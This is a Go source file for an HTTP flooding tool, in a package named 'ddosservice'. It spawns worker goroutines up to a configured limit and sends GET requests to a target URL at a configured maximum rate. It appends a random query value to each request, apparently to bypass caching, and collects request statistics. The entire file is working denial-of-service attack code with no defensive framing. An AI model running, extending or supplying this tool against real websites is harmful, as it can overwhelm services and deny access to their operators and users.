package ddosservice

import (
	"context"
	ddos "ddos/config"
	display "ddos/internal/display/app"
	statservice "ddos/internal/stat/domain/service"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

type Flooder struct {
	mu  *sync.RWMutex
	ctx context.Context

	config    *ddos.Config
	display   *display.Display
	collector *statservice.Collector
}

func NewFlooder(
	ctx context.Context,
	config *ddos.Config,
	display *display.Display,
	collector *statservice.Collector,
) *Flooder {
	return &Flooder{
		mu:        &sync.RWMutex{},
		ctx:       ctx,
		config:    config,
		display:   display,
		collector: collector,
	}
}

func (f *Flooder) Run() {
	f.collector.SetStartedAt(time.Now())

	wg := &sync.WaitGroup{}
	defer wg.Wait()

	wg.Add(1)
	go func() {
		defer wg.Done()

		requestSendTicker := time.NewTicker(time.Second / time.Duration(float64(f.config.MaxRPS)*1.10))
		defer requestSendTicker.Stop()

		threadSpawnTicker := time.NewTicker(time.Millisecond * 50)
		defer threadSpawnTicker.Stop()

		for {
			f.collector.SetRPS()

			select {
			case <-f.ctx.Done():
				return
			case <-threadSpawnTicker.C:
				f.spawnThread(wg, requestSendTicker, f.collector.RPS())
			}
		}
	}()
}

func (f *Flooder) spawnThread(wg *sync.WaitGroup, requestSendTicker *time.Ticker, crps int64) {
	trps := int64(float64(f.config.MaxRPS) * 0.95)
	if crps < trps && f.collector.Workers() < f.config.MaxWorkers {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-f.ctx.Done():
					return
				case <-requestSendTicker.C:
					f.sendRequest()
				}
			}
		}()
		f.collector.AddWorker()
	}
}

func (f *Flooder) sendRequest() {
	rand.Seed(time.Now().UnixNano())

	s := time.Now()
	defer func() {
		f.collector.AddTotal()
		f.collector.AddTotalDuration(time.Since(s))
	}()

	resp, err := http.Get(fmt.Sprintf("%v&ts=%d", f.config.URL, rand.Uint64()))
	if err != nil || resp.StatusCode != 200 {
		f.collector.AddFailed()
		f.collector.AddFailedDuration(time.Since(s))
		return
	}
	defer func() {
		_ = resp.Body.Close()
	}()

	_, _ = io.Copy(io.Discard, resp.Body)

	f.collector.AddSuccess()
	f.collector.AddSuccessDuration(time.Since(s))
}
